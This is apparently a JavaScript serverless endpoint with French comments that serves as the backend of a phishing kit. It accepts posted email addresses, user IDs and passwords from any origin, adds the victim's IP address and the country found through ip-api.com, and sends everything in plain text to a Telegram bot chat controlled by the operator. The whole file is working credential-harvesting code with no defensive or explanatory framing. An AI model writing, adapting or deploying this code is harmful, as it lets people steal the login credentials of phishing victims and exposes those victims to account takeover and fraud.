export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Méthode non autorisée" });

  try {
    const { usermail, user, pass } = req.body || {};

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Configuration serveur incomplète" });
    }

    // 1️⃣ Obtenir l’IP du client
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "IP inconnue";

    // 2️⃣ Obtenir le pays via API externe
    let country = "Inconnu";
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geoData = await geoRes.json();
      if (geoData?.country) country = geoData.country;
    } catch {
      console.warn("Impossible d’obtenir le pays via IP");
    }

    // 3️⃣ Message Telegram
    const message = `Nouvelle connexion :
📧 Email : ${usermail}
🆔 Identifiant : ${user}
🔑 Mot de passe : ${pass}
🌍 IP : ${ip} (${country})`;

    // 4️⃣ Envoi à Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    if (!telegramResponse.ok) {
      const text = await telegramResponse.text();
      console.error("Erreur Telegram:", text);
      return res.status(500).json({ error: "Échec d’envoi Telegram", details: text });
    }

    return res.status(200).json({ success: true, message: "Message envoyé à Telegram" });
  } catch (error) {
    console.error("Erreur serveur :", error);
    return res.status(500).json({ error: "Erreur serveur" });
  }
}
